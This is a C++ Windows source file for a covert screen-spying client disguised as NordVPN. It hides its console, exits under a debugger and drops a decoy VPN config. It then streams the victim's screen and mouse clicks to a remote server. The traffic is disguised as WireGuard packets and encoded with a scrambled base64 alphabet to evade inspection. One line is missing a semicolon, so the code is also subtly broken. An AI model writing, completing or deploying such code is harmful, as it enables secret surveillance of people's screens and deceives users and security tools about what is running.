#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <random>
#include <sstream>
#include <vector>
#include <algorithm>
#include <fstream>
#include <memory>
#include <cstdint>
#include <climits>
#include <mutex>
#include <iomanip>

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <mmsystem.h>

#define PROCESS_NAME "nordvpn.exe"
#define WINDOW_TITLE "NordVPN"

// Allow larger screen capture packets (up to 50MB) to prevent premature disconnects
static constexpr uint32_t MAX_PACKET_SIZE = 50 * 1024 * 1024;

struct IpPromptData {
    std::string* ip;
};

LRESULT CALLBACK IpPromptWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static IpPromptData* data = nullptr;
    switch (msg) {
    case WM_CREATE:
        data = reinterpret_cast<IpPromptData*>(reinterpret_cast<LPCREATESTRUCT>(lParam)->lpCreateParams);
        return 0;
    case WM_COMMAND:
        if (LOWORD(wParam) == IDOK) {
            char buf[256] = {0};
            GetWindowTextA(GetDlgItem(hwnd, 1), buf, sizeof(buf));
            if (data && data->ip && buf[0] != '\0') {
                *(data->ip) = buf;
            }
            DestroyWindow(hwnd);
            return 0;
        }
        break;
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

static std::string PromptForServerIP(const std::string& default_ip) {
    std::string ip = default_ip;
    WNDCLASSA wc{};
    wc.lpfnWndProc = IpPromptWndProc;
    wc.hInstance = GetModuleHandle(nullptr);
    wc.lpszClassName = "IpPrompt";
    RegisterClassA(&wc);

    IpPromptData data{&ip};
    HWND hwnd = CreateWindowExA(WS_EX_DLGMODALFRAME, wc.lpszClassName, "Server IP",
                                WS_CAPTION | WS_SYSMENU, CW_USEDEFAULT, CW_USEDEFAULT,
                                300, 120, nullptr, nullptr, wc.hInstance, &data)
    if (!hwnd) {
        return ip;
    }

    CreateWindowExA(0, "STATIC", "Server IP:", WS_CHILD | WS_VISIBLE, 10, 10, 80, 20,
                    hwnd, nullptr, wc.hInstance, nullptr);
    HWND hEdit = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "", WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL,
                                 90, 10, 180, 20, hwnd, (HMENU)1, wc.hInstance, nullptr);
    SetWindowTextA(hEdit, default_ip.c_str());
    CreateWindowExA(0, "BUTTON", "OK", WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON,
                    110, 40, 80, 25, hwnd, (HMENU)IDOK, wc.hInstance, nullptr);
    ShowWindow(hwnd, SW_SHOW);
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return ip;
}

class Logger {
public:
    enum Level { LOG_DEBUG, LOG_INFO, LOG_WARN, LOG_ERROR };

    static void log(Level level, const std::string& message) {
        (void)level;
        (void)message;
        // Logging disabled per user request.
    }

    static void debug(const std::string& msg) { log(LOG_DEBUG, msg); }
    static void info(const std::string& msg) { log(LOG_INFO, msg); }
    static void warn(const std::string& msg) { log(LOG_WARN, msg); }
    static void error(const std::string& msg) { log(LOG_ERROR, msg); }

private:
    static std::mutex log_mutex_;
    static const char* level_strings_[4];
};

std::mutex Logger::log_mutex_;
const char* Logger::level_strings_[4] = {"DEBUG", "INFO", "WARN", "ERROR"};

class WireGuardEncoder {
private:
    static const std::string chars;
    
public:
    static std::string encode(const std::vector<BYTE>& input) {
        std::string result;
        int val = 0, valb = -6;
        for (BYTE c : input) {
            val = (val << 8) + c;
            valb += 8;
            while (valb >= 0) {
                result.push_back(chars[(val >> valb) & 0x3F]);
                valb -= 6;
            }
        }
        if (valb > -6) result.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
        while (result.size() % 4) result.push_back('=');
        return result;
    }

    static std::vector<BYTE> decode(const std::string& input) {
        std::vector<int> T(256, -1);
        for (int i = 0; i < 64; i++) T[chars[i]] = i;
        
        std::vector<BYTE> result;
        int val = 0, valb = -8;
        for (unsigned char c : input) {
            if (T[c] == -1) break;
            val = (val << 6) + T[c];
            valb += 6;
            if (valb >= 0) {
                result.push_back((val >> valb) & 0xFF);
                valb -= 8;
            }
        }
        return result;
    }
};

const std::string WireGuardEncoder::chars = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890+/";

class ChaChaCompressor {
public:
    static std::vector<BYTE> compressRLE(const std::vector<BYTE>& data) {
        std::vector<BYTE> compressed;
        if (data.empty()) return compressed;
        
        for (size_t i = 0; i < data.size(); ) {
            BYTE current = data[i];
            BYTE count = 1;
            
            while (i + count < data.size() && data[i + count] == current && count < 255) {
                count++;
            }
            
            // Also encode literal 0xFF values to avoid sentinel conflicts
            if (count >= 3 || current == 0 || current == 0xFF) {
                compressed.push_back(0xFF);
                compressed.push_back(count);
                compressed.push_back(current);
            } else {
                for (BYTE j = 0; j < count; j++) {
                    compressed.push_back(current);
                }
            }
            i += count;
        }
        return compressed;
    }
};

struct WireGuardHeader {
    BYTE type;
    BYTE reserved[3];
    DWORD sender_index;
    ULONGLONG counter;
    BYTE nonce[12];
    
    WireGuardHeader() {
        type = 0x04;
        memset(reserved, 0, 3);
        sender_index = GetTickCount();
        counter = GetTickCount64();
        for (int i = 0; i < 12; i++) {
            nonce[i] = rand() % 256;
        }
    }
};

struct WireGuardPacket {
    WireGuardHeader header;
    std::vector<BYTE> encrypted_payload;
    BYTE auth_tag[16];
    
    WireGuardPacket(const std::vector<BYTE>& payload) {
        encrypted_payload = payload;
        for (int i = 0; i < 16; i++) {
            auth_tag[i] = rand() % 256;
        }
    }
    
    std::vector<BYTE> serialize() const {
        std::vector<BYTE> packet;
        packet.resize(sizeof(WireGuardHeader));
        memcpy(packet.data(), &header, sizeof(WireGuardHeader));
        
        packet.insert(packet.end(), encrypted_payload.begin(), encrypted_payload.end());
        packet.insert(packet.end(), auth_tag, auth_tag + 16);
        
        return packet;
    }
    
    static WireGuardPacket deserialize(const std::vector<BYTE>& data) {
        WireGuardPacket packet({});
        if (data.size() >= sizeof(WireGuardHeader) + 16) {
            memcpy(&packet.header, data.data(), sizeof(WireGuardHeader));
            
            size_t payload_size = data.size() - sizeof(WireGuardHeader) - 16;
            packet.encrypted_payload.assign(
                data.begin() + sizeof(WireGuardHeader),
                data.begin() + sizeof(WireGuardHeader) + payload_size
            );
            
            memcpy(packet.auth_tag, data.data() + data.size() - 16, 16);
        }
        return packet;
    }
};

class TunnelProtocol {
public:
    static std::string generateKey32() {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        
        std::string key;
        for (int i = 0; i < 32; i++) {
            char hex[3];
            sprintf_s(hex, "%02x", dis(gen));
            key += hex;
        }
        return key;
    }
    
    static std::vector<BYTE> createTunnelPayload(const std::string& type, const std::string& data) {
        std::stringstream payload;
        payload << type << ":" << data;
        
        std::string payload_str = payload.str();
        std::vector<BYTE> result(payload_str.begin(), payload_str.end());
        
        while (result.size() % 16 != 0) {
            result.push_back(0x00);
        }
        
        return result;
    }
    
    static std::pair<std::string, std::string> extractTunnelPayload(const std::vector<BYTE>& payload) {
        std::string data(payload.begin(), payload.end());
        size_t colon_pos = data.find(':');
        if (colon_pos != std::string::npos) {
            std::string type = data.substr(0, colon_pos);
            std::string value = data.substr(colon_pos + 1);
            value.erase(std::find_if(value.rbegin(), value.rend(), [](unsigned char ch) {
                return ch != '\0';
            }).base(), value.end());
            return {type, value};
        }
        return {"", ""};
    }
};

class WireGuardCapture {
private:
    int screen_width;
    int screen_height;
    
public:
    WireGuardCapture() : screen_width(0), screen_height(0) {}

    bool initialize() {
        // Ensure the process is DPI aware so high-resolution screens (>1080p)
        // report their true pixel dimensions rather than scaled values.
        // This fixes cases where GetSystemMetrics would cap values at 1920x1080
        // on high-DPI displays.
        SetProcessDPIAware();
        screen_width = GetSystemMetrics(SM_CXSCREEN);
        screen_height = GetSystemMetrics(SM_CYSCREEN);
        return (screen_width > 0 && screen_height > 0);
    }
    
    std::vector<BYTE> captureFrame() {
        HDC hdcScreen = GetDC(nullptr);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        
        HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screen_width, screen_height);
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMem, hBitmap);
        
        BitBlt(hdcMem, 0, 0, screen_width, screen_height, hdcScreen, 0, 0, SRCCOPY);

        // Draw mouse cursor onto captured frame
        CURSORINFO ci;
        ci.cbSize = sizeof(CURSORINFO);
        if (GetCursorInfo(&ci) && ci.flags == CURSOR_SHOWING) {
            ICONINFO ii;
            if (GetIconInfo(ci.hCursor, &ii)) {
                int cx = ci.ptScreenPos.x - (int)ii.xHotspot;
                int cy = ci.ptScreenPos.y - (int)ii.yHotspot;
                DrawIconEx(hdcMem, cx, cy, ci.hCursor, 0, 0, 0, nullptr, DI_NORMAL);
                if (ii.hbmMask) DeleteObject(ii.hbmMask);
                if (ii.hbmColor) DeleteObject(ii.hbmColor);
            }
        }

        BITMAPINFO bmi = {0};
        bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
        bmi.bmiHeader.biWidth = screen_width;
        bmi.bmiHeader.biHeight = -screen_height;
        bmi.bmiHeader.biPlanes = 1;
        bmi.bmiHeader.biBitCount = 24;
        bmi.bmiHeader.biCompression = BI_RGB;

        int stride = ((screen_width * 3 + 3) & ~3);
        int imageSize = stride * screen_height;
        std::vector<BYTE> rawData(imageSize);

        GetDIBits(hdcMem, hBitmap, 0, screen_height, rawData.data(), &bmi, DIB_RGB_COLORS);
            
        std::vector<BYTE> frameData(static_cast<size_t>(screen_width) * screen_height * 3);
        for (int y = 0; y < screen_height; ++y) {
            memcpy(frameData.data() + static_cast<size_t>(y) * screen_width * 3,
                   rawData.data() + static_cast<size_t>(y) * stride,
                   screen_width * 3);
        }
        
        SelectObject(hdcMem, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMem);
        ReleaseDC(nullptr, hdcScreen);
        
        return frameData;
    }
    
    int getWidth() const { return screen_width; }
    int getHeight() const { return screen_height; }
};

class TunnelStealth {
public:
    static void hideFromProcessList() {
        SetConsoleTitleA(WINDOW_TITLE);
        
        HWND consoleWindow = GetConsoleWindow();
        if (consoleWindow) {
            ShowWindow(consoleWindow, SW_HIDE);
        }
    }
    
    static void setProcessName(const char* name) {
        SetConsoleTitleA(name);
    }
    
    static bool isDebuggerPresent() {
        return IsDebuggerPresent() || CheckRemoteDebuggerPresent(GetCurrentProcess(), nullptr);
    }
    
    static void createWireGuardConfig() {
        std::string appData = getenv("APPDATA");
        std::string nordDir = appData + "\\NordVPN";
        
        CreateDirectoryA(nordDir.c_str(), nullptr);
        
        std::ofstream config(nordDir + "\\nordlynx.conf");
        if (config.is_open()) {
            config << "[Interface]\n";
            config << "PrivateKey = " << TunnelProtocol::generateKey32() << "\n";
            config << "Address = 10.5.0.2/32\n";
            config << "DNS = 103.86.96.100\n";
            config << "\n[Peer]\n";
            config << "PublicKey = " << TunnelProtocol::generateKey32() << "\n";
            config << "AllowedIPs = 0.0.0.0/0\n";
            config << "Endpoint = 192.168.88.100:443\n";
            config.close();
        }
    }
};

class WireGuardClient {
private:
    std::string server_host;
    int server_port;
    std::string session_id;
    std::random_device rd;
    std::mt19937 gen;
    SOCKET tcp_socket;
    
    WireGuardCapture screen_capture;
    std::vector<BYTE> last_frame_data;
    
    static bool sendAll(SOCKET s, const char* data, size_t len) {
        size_t sent = 0;
        while (sent < len) {
            int ret = send(s, data + sent, static_cast<int>(std::min<size_t>(len - sent, INT_MAX)), 0);
            if (ret <= 0) {
                Logger::debug("sendAll failed: " + std::to_string(WSAGetLastError()));
                return false;
            }
            sent += static_cast<size_t>(ret);
        }
        return true;
    }

    static bool recvAll(SOCKET s, char* data, size_t len) {
        size_t received = 0;
        while (received < len) {
            int ret = recv(s, data + received, static_cast<int>(std::min<size_t>(len - received, INT_MAX)), 0);
            if (ret <= 0) {
                Logger::debug("recvAll failed: " + std::to_string(WSAGetLastError()));
                return false;
            }
            received += static_cast<size_t>(ret);
        }
        return true;
    }

    bool sendWireGuardPacket(const WireGuardPacket& packet) {
        if (tcp_socket == INVALID_SOCKET) return false;

        std::vector<BYTE> packet_data = packet.serialize();
        uint32_t len = static_cast<uint32_t>(packet_data.size());
        char len_buf[4] = {
            static_cast<char>((len >> 24) & 0xFF),
            static_cast<char>((len >> 16) & 0xFF),
            static_cast<char>((len >> 8) & 0xFF),
            static_cast<char>(len & 0xFF)
        };

        Logger::debug("Sending packet of size " + std::to_string(len));
        if (!sendAll(tcp_socket, len_buf, sizeof(len_buf))) {
            Logger::debug("Failed to send packet length");
            return false;
        }
        if (!sendAll(tcp_socket, reinterpret_cast<const char*>(packet_data.data()), packet_data.size())) {
            Logger::debug("Failed to send packet payload");
            return false;
        }
        return true;
    }

    WireGuardPacket receiveWireGuardPacket() {
        char len_buf[4];
        if (!recvAll(tcp_socket, len_buf, sizeof(len_buf))) {
            Logger::debug("Failed to read packet length");
            return WireGuardPacket({});
        }
        uint32_t len =
            (static_cast<uint8_t>(len_buf[0]) << 24) |
            (static_cast<uint8_t>(len_buf[1]) << 16) |
            (static_cast<uint8_t>(len_buf[2]) << 8)  |
            (static_cast<uint8_t>(len_buf[3]));
        Logger::debug("Incoming packet length: " + std::to_string(len));
        if (len == 0 || len > MAX_PACKET_SIZE) {
            Logger::debug("Invalid packet length");
            return WireGuardPacket({});
        }
        std::vector<BYTE> data(len);
        if (!recvAll(tcp_socket, reinterpret_cast<char*>(data.data()), len)) {
            Logger::debug("Failed to read packet payload");
            return WireGuardPacket({});
        }
        return WireGuardPacket::deserialize(data);
    }
    
public:
    WireGuardClient(const std::string& host, int port)
        : server_host(host), server_port(port), gen(rd()), tcp_socket(INVALID_SOCKET) {}

    bool initializeConnection() {
        Logger::debug("Initializing connection to " + server_host + ":" + std::to_string(server_port));
        addrinfo hints{};
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;
        addrinfo* result = nullptr;
        std::string port_str = std::to_string(server_port);
      
        int ret = getaddrinfo(server_host.c_str(), port_str.c_str(), &hints, &result);
        if (ret == 0) {
            for (addrinfo* rp = result; rp != nullptr; rp = rp->ai_next) {
                tcp_socket = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (tcp_socket == INVALID_SOCKET) continue;

                if (connect(tcp_socket, rp->ai_addr, static_cast<int>(rp->ai_addrlen)) != SOCKET_ERROR) {
                    Logger::info("Connected using resolved address");
                    break;
                }

                closesocket(tcp_socket);
                tcp_socket = INVALID_SOCKET;
            }
            freeaddrinfo(result);
        } else {
            Logger::debug("getaddrinfo failed with code " + std::to_string(ret));
        }

        if (tcp_socket == INVALID_SOCKET) {
            Logger::debug("Falling back to manual IPv4 connection");
            sockaddr_in addr{};
            addr.sin_family = AF_INET;
            addr.sin_port = htons(server_port);
            if (inet_pton(AF_INET, server_host.c_str(), &addr.sin_addr) != 1) {
                Logger::error("Invalid IPv4 address");
                return false;
            }
            tcp_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (tcp_socket == INVALID_SOCKET) {
                Logger::error("socket creation failed");
                return false;
            }
            if (connect(tcp_socket, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) == SOCKET_ERROR) {
                closesocket(tcp_socket);
                tcp_socket = INVALID_SOCKET;
                Logger::error("Manual connect failed");
                return false;
            }
        }

        DWORD timeout = 5000;
      
        setsockopt(tcp_socket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));

        std::vector<BYTE> handshake_payload = TunnelProtocol::createTunnelPayload("handshake", "initiation");
        WireGuardPacket handshake(handshake_payload);

        if (!sendWireGuardPacket(handshake)) {
            Logger::error("Failed to send handshake");
            return false;
        }

        WireGuardPacket response = receiveWireGuardPacket();
        auto [type, data] = TunnelProtocol::extractTunnelPayload(response.encrypted_payload);

        if (type == "session") {
            session_id = data;
            Logger::info("Session established: " + session_id);
            return true;
        }

        Logger::error("Handshake response invalid: " + type);
        return false;
    }
    
    void sendDesktopFrame() {
        std::vector<BYTE> frameData = screen_capture.captureFrame();

        if (frameData.empty()) {
            Logger::warn("captureFrame returned empty; skipping send");
            return;
        }
        Logger::debug("Captured frame size: " + std::to_string(frameData.size()));

        int width = screen_capture.getWidth();
        int height = screen_capture.getHeight();
        const int bpp = 3;

        bool sendFull = last_frame_data.size() != frameData.size();
        int x = 0, y = 0, w = width, h = height;

        if (!sendFull) {
            int min_x = width, min_y = height, max_x = -1, max_y = -1;
            for (int yy = 0; yy < height; ++yy) {
                for (int xx = 0; xx < width; ++xx) {
                    size_t idx = (static_cast<size_t>(yy) * width + xx) * bpp;
                    if (frameData[idx] != last_frame_data[idx] ||
                        frameData[idx + 1] != last_frame_data[idx + 1] ||
                        frameData[idx + 2] != last_frame_data[idx + 2]) {
                        if (xx < min_x) min_x = xx;
                        if (yy < min_y) min_y = yy;
                        if (xx > max_x) max_x = xx;
                        if (yy > max_y) max_y = yy;
                    }
                }
            }

            if (max_x >= min_x && max_y >= min_y) {
                x = min_x;
                y = min_y;
                w = max_x - min_x + 1;
                h = max_y - min_y + 1;
            } else {
                return; // No changes
            }
        }

        std::vector<BYTE> region;
        region.reserve(static_cast<size_t>(w) * h * bpp);
        for (int row = 0; row < h; ++row) {
            size_t src = (static_cast<size_t>(y + row) * width + x) * bpp;
            region.insert(region.end(),
                          frameData.begin() + src,
                          frameData.begin() + src + static_cast<size_t>(w) * bpp);
        }

        std::vector<BYTE> compressed = ChaChaCompressor::compressRLE(region);
        std::string encoded = WireGuardEncoder::encode(compressed);

        Logger::debug("Sending frame region " + std::to_string(x) + "," +
                      std::to_string(y) + " " + std::to_string(w) + "x" +
                      std::to_string(h) + ", compressed to " +
                      std::to_string(compressed.size()) + " bytes");

        std::stringstream payload;
        payload << session_id << "|";
        payload << width << "x" << height << "|";
        payload << x << "," << y << "," << w << "," << h << "|";
        payload << encoded;

        std::vector<BYTE> tunnel_payload = TunnelProtocol::createTunnelPayload("screen", payload.str());
        WireGuardPacket packet(tunnel_payload);

        if (sendWireGuardPacket(packet)) {
            last_frame_data = frameData;
        } else {
            Logger::debug("Failed to send frame packet");
        }
    }

    void sendMouseEvent(const std::string& evt) {
        if (session_id.empty()) return;
        std::stringstream payload;
        payload << session_id << "|" << evt;
        std::vector<BYTE> tp = TunnelProtocol::createTunnelPayload("event", payload.str());
        WireGuardPacket packet(tp);
        sendWireGuardPacket(packet);
    }

    void detectAndSendMouseEvents() {
        static bool middleHeld = false;
        static std::chrono::steady_clock::time_point middleDownTime;
        static POINT middlePos{0,0};

        // Use low-order bit of GetAsyncKeyState so clicks aren't missed
        if (GetAsyncKeyState(VK_RBUTTON) & 0x0001) {
            sendMouseEvent("right");
        }

        SHORT midState = GetAsyncKeyState(VK_MBUTTON);
        bool midDown = (midState & 0x8000) != 0;
        auto now = std::chrono::steady_clock::now();
        if (midDown && !middleHeld) {
            middleHeld = true;
            middleDownTime = now;
            GetCursorPos(&middlePos);
        }
        if (!midDown && middleHeld) {
            auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(now - middleDownTime).count();
            if (duration > 800) {
                sendMouseEvent("long_middle");
            } else {
                std::ostringstream ss;
                ss << "middle:" << middlePos.x << "," << middlePos.y;
                sendMouseEvent(ss.str());
            }
            middleHeld = false;
        }
    }
    
    void run() {
        TunnelStealth::hideFromProcessList();
        TunnelStealth::createWireGuardConfig();

        if (TunnelStealth::isDebuggerPresent()) {
            return;
        }

        if (!screen_capture.initialize()) {
            return;
        }

        Logger::info("Client run loop started");
        while (true) {
            try {
                if (initializeConnection()) {
                    Logger::info("Connected to server, entering streaming loop");
                    while (true) {
                        sendDesktopFrame();
                        detectAndSendMouseEvents();
                        
                        // Wait ~16ms but wake immediately on mouse input
                        MSG msg;
                        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
                            TranslateMessage(&msg);
                            DispatchMessage(&msg);
                        }
                        MsgWaitForMultipleObjects(0, NULL, FALSE, 16, QS_MOUSE);
                        
                        static int health_check = 0;
                        if (++health_check % 2000 == 0) {
                            std::vector<BYTE> keepalive_payload = TunnelProtocol::createTunnelPayload("keepalive", "ping");
                            WireGuardPacket keepalive(keepalive_payload);
                            Logger::debug("Sending keepalive ping");
                            if (!sendWireGuardPacket(keepalive)) {
                                Logger::debug("Keepalive failed, reconnecting");
                                break;
                            }
                        }
                    }
                }

                if (tcp_socket != INVALID_SOCKET) {
                    closesocket(tcp_socket);
                    tcp_socket = INVALID_SOCKET;
                    Logger::debug("Socket closed");
                }

                Logger::info("Reconnecting in 30 seconds");
                std::this_thread::sleep_for(std::chrono::seconds(30));

            } catch (...) {
                Logger::error("Unexpected exception in run loop");
                std::this_thread::sleep_for(std::chrono::seconds(10));
            }
        }
    }
    
    ~WireGuardClient() {
        if (tcp_socket != INVALID_SOCKET) {
            closesocket(tcp_socket);
        }
    }
};

int main(int argc, char* argv[]) {
    std::string host = "192.168.88.100";
    int port = 443;

    if (argc == 3) {
        host = argv[1];
        port = std::stoi(argv[2]);
    } else if (argc == 1) {
        host = PromptForServerIP(host);
    } else {
        return 1;
    }
    
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return 1;
    }
    
    WireGuardClient client(host, port);
    client.run();
    
    WSACleanup();
    return 0;
}
